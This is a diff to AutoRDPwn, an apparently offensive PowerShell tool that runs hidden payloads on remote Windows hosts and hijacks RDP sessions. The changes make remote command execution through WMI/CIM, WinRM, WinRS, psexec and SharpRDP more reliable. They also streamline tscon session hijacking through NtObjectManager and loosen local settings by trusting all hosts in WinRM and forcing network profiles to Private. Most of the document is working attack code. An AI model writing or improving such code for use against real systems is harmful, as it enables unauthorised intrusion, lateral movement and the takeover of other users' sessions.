@@ -93,8 +93,8 @@ function Start-RemoteViewer {
     # stored credential via cmdkey: mstsc /shadow with /prompt is what breaks local/domain accounts
     param($computer, $user, $PlainTextPassword, $control, $shadow, $sticky, $vncserver)
     if($vncserver){ $port = 5900 } else { $port = 3389 }
-    $open = Test-NetConnection -ComputerName $computer -Port $port -InformationLevel Quiet -WarningAction SilentlyContinue 2>&1> $null
-    if($open -eq $false){ Write-Host ; Write-Host "[!] Puerto $port cerrado en $computer.. revisa firewall o el servicio" -ForegroundColor Red ; Start-Sleep -milliseconds 1000 }
+    $open = Test-RemoteTcp -Computer $computer -Port $port -TimeoutMs 1500
+    if($open -eq $false){ Write-Host ; Write-Host "[!] Puerto $port cerrado en $computer.. revisa firewall o el servicio" -ForegroundColor Red ; Start-Sleep -Milliseconds 400 }
     if($vncserver){ if($control -eq 'false'){ return Start-Process .\VNCViewer.exe -ArgumentList "/password AutoRDPwn /viewonly $computer -disablesponsor -nostatus -notoolbar -autoscaling -nocursor" -PassThru }
     else { return Start-Process .\VNCViewer.exe -ArgumentList "/password AutoRDPwn $computer -disablesponsor -nostatus -notoolbar -autoscaling -nocursor" -PassThru }}
     if($sticky){ return Start-Process mstsc -ArgumentList "/v $computer /admin /f" -PassThru }
@@ -109,6 +109,14 @@ function Test-Command {
     try {if(Get-Command $command){RETURN $true}}
     Catch {RETURN $false}
     Finally {$ErrorActionPreference=$oldPreference}}
+
+function Test-RemoteTcp {
+    # bounded TCP probe: instant when the port is open, no ICMP/DNS wait like Test-NetConnection (seconds)
+    param($Computer, $Port, $TimeoutMs = 1500)
+    try { $client = New-Object System.Net.Sockets.TcpClient ; $async = $client.BeginConnect($Computer, $Port, $null, $null)
+        $ok = $async.AsyncWaitHandle.WaitOne($TimeoutMs) ; $connected = $client.Connected ; $client.Close()
+        if($ok -and $connected){ return $true } ; return $false }
+    catch { return $false }}
 
 function Remove-Exclusions { 
     $exclusion = Get-MpPreference ; $exclusion.exclusionprocess | % { Remove-MpPreference -ExclusionProcess $_ 2>&1> $null }
@@ -187,7 +195,7 @@ function Remove-Exclusions {
         .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe -windowstyle hidden "$Pwn2" -nobanner -accepteula
         .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe -windowstyle hidden "$Pwn3" -nobanner -accepteula
         .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe -windowstyle hidden "$Pwn4" -nobanner -accepteula }
-        del .\psexec.exe }
+        del .\psexec.exe 2>&1> $null }
 
         '2' {
         Write-Host ; & $question ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
@@ -222,22 +230,14 @@ function Remove-Exclusions {
         $PlainTextPassword = Read-PlainText ; $password = $PlainTextPassword | ConvertTo-SecureString -AsPlainText -Force ; $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
         if(!$credential) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 1000 }
         $Host.UI.RawUI.ForegroundColor = 'Blue' }
-        if(!$user) { Invoke-WmiMethod -computer $computer -path win32_process -name create -argumentList $Pwn1 2>&1> $null ; Write-Host
-        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[!] Command execution failed!" -ForegroundColor Red }
-        Invoke-WmiMethod -computer $computer -path win32_process -name create -argumentList $Pwn2 2>&1> $null ; Write-Host
-        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[!] Command execution failed!" -ForegroundColor Red }
-        Invoke-WmiMethod -computer $computer -path win32_process -name create -argumentList $Pwn3 2>&1> $null ; Write-Host
-        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[!] Command execution failed!" -ForegroundColor Red }
-        Invoke-WmiMethod -computer $computer -path win32_process -name create -argumentList $Pwn4 2>&1> $null ; Write-Host
-        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[!] Command execution failed!" -ForegroundColor Red }}
-        if($user) { Invoke-WmiMethod -computer $computer -credential $credential -path win32_process -name create -argumentList $Pwn1 2>&1> $null ; Write-Host
-        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[!] Command execution failed!" -ForegroundColor Red }
-        Invoke-WmiMethod -computer $computer -credential $credential -path win32_process -name create -argumentList $Pwn2 2>&1> $null ; Write-Host
-        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[!] Command execution failed!" -ForegroundColor Red }
-        Invoke-WmiMethod -computer $computer -credential $credential -path win32_process -name create -argumentList $Pwn3 2>&1> $null ; Write-Host
-        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[!] Command execution failed!" -ForegroundColor Red }
-        Invoke-WmiMethod -computer $computer -credential $credential -path win32_process -name create -argumentList $Pwn4 2>&1> $null ; Write-Host
-        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[!] Command execution failed!" -ForegroundColor Red }}}
+        $CimSes = $null ; if($user -and !$credential){ $credential = New-Object System.Management.Automation.PSCredential ( $user, $password ) }
+        try { $cimargs = @{ ComputerName = $computer ; SessionOption = (New-CimSessionOption -Protocol Dcom) ; ErrorAction = 'Stop' } ; if($user){ $cimargs['Credential'] = $credential }
+        $CimSes = New-CimSession @cimargs } catch { Write-Host "[!] Command execution failed!" -ForegroundColor Red }
+        foreach ($pwn in @($Pwn1,$Pwn2,$Pwn3,$Pwn4)) { try { if(!$CimSes){ throw }
+        $result = Invoke-CimMethod -CimSession $CimSes -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = "powershell.exe -windowstyle hidden $pwn" } -ErrorAction Stop
+        if($result.ReturnValue -eq 0){ Write-Host "[+] Command was executed successfully!" } else { Write-Host "[!] Command execution failed!" -ForegroundColor Red } }
+        catch { Write-Host "[!] Command execution failed!" -ForegroundColor Red } ; Write-Host }
+        if($CimSes){ Remove-CimSession $CimSes 2>&1> $null }}
 
         '4' {
         if($option) { $computer='localhost' } else {
@@ -252,22 +252,14 @@ function Remove-Exclusions {
         $PlainTextPassword = Read-PlainText ; $password = $PlainTextPassword | ConvertTo-SecureString -AsPlainText -Force ; $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
         if(!$credential) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 1000 }
         $Host.UI.RawUI.ForegroundColor = 'Blue' }
-        if(!$user) { Invoke-Command -Computer $computer -Authentication Negotiate -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn1 2>&1> $null ; Write-Host }
-        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[!] Command execution failed!" -ForegroundColor Red }
-        Invoke-Command -Computer $computer -Authentication Negotiate -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn2 2>&1> $null ; Write-Host }
-        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[!] Command execution failed!" -ForegroundColor Red }
-        Invoke-Command -Computer $computer -Authentication Negotiate -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn3 2>&1> $null ; Write-Host }
-        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[!] Command execution failed!" -ForegroundColor Red }
-        Invoke-Command -Computer $computer -Authentication Negotiate -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn4 2>&1> $null ; Write-Host }
-        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[!] Command execution failed!" -ForegroundColor Red }}
-        if($user) { Invoke-Command -Computer $computer -credential $credential -Authentication Negotiate -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn1 2>&1> $null ; Write-Host }
-        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[!] Command execution failed!" -ForegroundColor Red }
-        Invoke-Command -Computer $computer -credential $credential -Authentication Negotiate -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn2 2>&1> $null ; Write-Host }
-        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[!] Command execution failed!" -ForegroundColor Red }
-        Invoke-Command -Computer $computer -credential $credential -Authentication Negotiate -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn3 2>&1> $null ; Write-Host }
-        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[!] Command execution failed!" -ForegroundColor Red }
-        Invoke-Command -Computer $computer -credential $credential -Authentication Negotiate -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn4 2>&1> $null ; Write-Host }
-        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[!] Command execution failed!" -ForegroundColor Red }}}
+        if($user -and !$credential){ $credential = New-Object System.Management.Automation.PSCredential ( $user, $password ) }
+        $sessionoption = New-PSSessionOption -OpenTimeout 8000 -CancelTimeout 3000 -OperationTimeout 30000
+        try { if(!$user){ $RDP = New-PSSession -Computer $computer -Authentication Negotiate -SessionOption $sessionoption -ErrorAction Stop }
+        else { $RDP = New-PSSession -Computer $computer -credential $credential -Authentication Negotiate -SessionOption $sessionoption -ErrorAction Stop } } catch { $RDP = $null }
+        if($RDP){ Write-Host "[i] $computer: ejecutando payloads por WinRM en una sesion unica.." -ForegroundColor DarkGray }
+        foreach ($pwn in @($Pwn1,$Pwn2,$Pwn3,$Pwn4)) { try { if(!$RDP){ throw }
+        Invoke-Command -Session $RDP -ScriptBlock { Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoProfile','-Command',$using:pwn -ErrorAction Stop } -ErrorAction Stop ; Write-Host "[+] Command was executed successfully!" }
+        catch { Write-Host "[!] Command execution failed!" -ForegroundColor Red } }}
 
         '5' {
         Write-Host ; & $question ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
@@ -281,19 +273,21 @@ function Remove-Exclusions {
         do { Write-Host ; & $question ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
         $PlainTextPassword = Read-PlainText ; $password = $PlainTextPassword | ConvertTo-SecureString -AsPlainText -Force
         if(!$PlainTextPassword) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 1000 }} until ( $PlainTextPassword )
-        $Host.UI.RawUI.ForegroundColor = 'Blue' ; $winrsok = 0
-        foreach ($pwn in @($Pwn1,$Pwn2,$Pwn3,$Pwn4)) { WinRS /r:$computer /u:$user /p:$PlainTextPassword /noecho /noprofile /allowdelegate "powershell.exe -windowstyle hidden $pwn" 2>&1> $null
-        if($? -eq 'True') { $winrsok++ }}
-        if($winrsok -gt 0) { Write-Host "[+] Command was executed successfully! ($winrsok/4)" -ForegroundColor Green } else { Write-Host "[!] Command execution failed! (0/4)" -ForegroundColor Red }}
+        $Host.UI.RawUI.ForegroundColor = 'Blue'
+        Write-Host "[i] $computer: habilitando WinRM/firewall en el destino (1 sola autenticacion WinRS).." -ForegroundColor DarkGray
+        WinRS /r:$computer /u:$user /p:$PlainTextPassword /noecho /noprofile /allowdelegate "powershell.exe -windowstyle hidden $Pwn1 ; $Pwn2 ; $Pwn3 ; $Pwn4" 2>&1> $null
+        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" -ForegroundColor Green } else { Write-Host "[!] Command execution failed!" -ForegroundColor Red }}
 
         '6' {
         Write-Host ; $test = Test-Command tscon ; if($test -in 'True'){ Write-Host "[i] $txt28" -ForegroundColor Green ; Write-Host
-        Install-PackageProvider -Name NuGet -Force 2>&1> $null ; Install-Module -Name NtObjectManager -SkipPublisherCheck -Force 2>&1> $null
-        Write-Host "[+] $txt35" -ForegroundColor Blue ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; Start-Sleep -milliseconds 2000 ; query session 
+        if(!(Get-Module -ListAvailable -Name NtObjectManager -ErrorAction SilentlyContinue)){ Write-Host "[i] Instalando NtObjectManager (solo la primera vez; despues se carga de cache).." -ForegroundColor DarkGray
+        Install-PackageProvider -Name NuGet -Force 2>&1> $null ; Install-Module -Name NtObjectManager -SkipPublisherCheck -Force 2>&1> $null }
+        Import-Module NtObjectManager -ErrorAction SilentlyContinue 2>&1> $null
+        Write-Host "[+] $txt35" -ForegroundColor Blue ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; query session 
         do { Write-Host ; & $question ; Write-Host "$txt36" -NoNewLine -ForegroundColor Gray ; $tscon = $Host.UI.ReadLine() ; 
-        if(!$tscon){ Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 } elseif($tscon -notmatch '^[1-99]+$'){
+        if(!$tscon){ Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 } elseif($tscon -notmatch '^[0-9]+$'){
         Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 ; $tscon = $null }} until ($tscon)
-        Start-Sleep -milliseconds 2000 ; Start-Win32ChildProcess "tscon $tscon" 2>&1> $null ; if($? -in 'True'){ continue } else{ $tsfail = 'True' }}
+        Start-Win32ChildProcess "tscon $tscon" 2>&1> $null ; if($? -in 'True'){ continue } else{ $tsfail = 'True' }}
         else { Write-Host "[!] $txt5" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 ; $input = $null ; Show-Banner ; Show-Menu }}
 
         '7' {
@@ -318,7 +312,7 @@ function Remove-Exclusions {
         .\SharpRDP.exe computername=$computer username=$user password=$PlainTextPassword command="powershell.exe -windowstyle hidden $Pwn2" ; Write-Host
         .\SharpRDP.exe computername=$computer username=$user password=$PlainTextPassword command="powershell.exe -windowstyle hidden $Pwn3" ; Write-Host
         .\SharpRDP.exe computername=$computer username=$user password=$PlainTextPassword command="powershell.exe -windowstyle hidden $Pwn4" }
-        del .\SharpRDP.exe }
+        del .\SharpRDP.exe 2>&1> $null }
         
         'M' { Show-Banner ; Show-Modules ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
         $Random = New-Object System.Random ; "$txt8" -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
@@ -601,10 +595,16 @@ function Remove-Exclusions {
         default { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }}} until ($input -in '1','2','3','4','5','6','7','X')
 
    if($input -in '1','2','3','4','5','7'){ $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; if($hash){ $user = "AutoRDPwn" ; $password = "AutoRDPwn" | ConvertTo-SecureString -AsPlainText -Force }
-   $Host.UI.RawUI.ForegroundColor = 'Green' ; if($user){ $user = Resolve-TargetUser $user $computer } ; winrm quickconfig -force 2>&1> $null ; Set-Item wsman:\localhost\client\trustedhosts * -Force 2>&1> $null
-   Set-NetConnectionProfile -InterfaceIndex ((Get-NetConnectionProfile).interfaceindex) -NetworkCategory Private ; Write-Host "[i] Conectando con $computer" -NoNewLine -ForegroundColor Green ; $i = 0 ; do { $i++ ; Write-Host "." -NoNewLine
-   if(!$user) { $RDP = New-PSSession -Computer $computer -Authentication Negotiate -ErrorAction SilentlyContinue } ; if($user) { $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
-   $RDP = New-PSSession -Computer $computer -credential $credential -Authentication Negotiate -ErrorAction SilentlyContinue } ; Start-Sleep -milliseconds 300 } until ($RDP -or $i -eq 10) ; Write-Host ; $session = $RDP ; if ($session){ $attack = "true"
+   $Host.UI.RawUI.ForegroundColor = 'Green' ; if($user){ $user = Resolve-TargetUser $user $computer }
+   $wsvc = Get-Service WinRM -ErrorAction SilentlyContinue ; if(!$wsvc -or $wsvc.Status -ne 'Running' -or $wsvc.StartType -ne 'Automatic'){ winrm quickconfig -force 2>&1> $null }
+   if((Get-Item WSMan:\localhost\Client\Trustedhosts -ErrorAction SilentlyContinue).Value -ne '*'){ Set-Item wsman:\localhost\client\trustedhosts * -Force 2>&1> $null }
+   Get-NetConnectionProfile -ErrorAction SilentlyContinue | Where-Object { $_.NetworkCategory -ne 'Private' } | ForEach-Object { Set-NetConnectionProfile -InterfaceIndex $_.InterfaceIndex -NetworkCategory Private -ErrorAction SilentlyContinue }
+   Write-Host "[i] Conectando con $computer" -NoNewLine -ForegroundColor Green ; $sessionoption = New-PSSessionOption -OpenTimeout 8000 -CancelTimeout 3000 -OperationTimeout 60000 ; $connectdeadline = (Get-Date).AddSeconds(45) ; $failopen = 0
+   if(!$RDP){ do { Write-Host "." -NoNewLine ; if(Test-RemoteTcp -Computer $computer -Port 5985 -TimeoutMs 1300){
+   try { if(!$user){ $RDP = New-PSSession -Computer $computer -Authentication Negotiate -SessionOption $sessionoption -ErrorAction Stop } else { $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
+   $RDP = New-PSSession -Computer $computer -credential $credential -Authentication Negotiate -SessionOption $sessionoption -ErrorAction Stop } } catch { $RDP = $null ; $failopen++ ; Start-Sleep -Milliseconds 700 } }
+   else { $failopen = 0 ; Start-Sleep -Milliseconds 1100 }} until ($RDP -or $failopen -ge 3 -or (Get-Date) -gt $connectdeadline) }
+   Write-Host ; if(!$RDP){ Write-Host "[!] WinRM (5985) sin respuesta en $computer.. el modo espejo no funcionara" -ForegroundColor Red } ; $session = $RDP ; if ($session){ $attack = "true"
 
         do { $seeshadow = "see", "view", "ver", "regarder", "siehe", "vedere", "увидеть", "1" ; $controlshadow = "control", "controlar", "contrôle", "kontrolle", "controllo", "контроль", "2"
         $Host.UI.RawUI.ForegroundColor = 'Green' ; if($sticky){ $stickyshadow = "sticky" ; $inputoption = "sticky"} elseif($shadowoption -like '-shadow') { $inputoption=$args[7] }
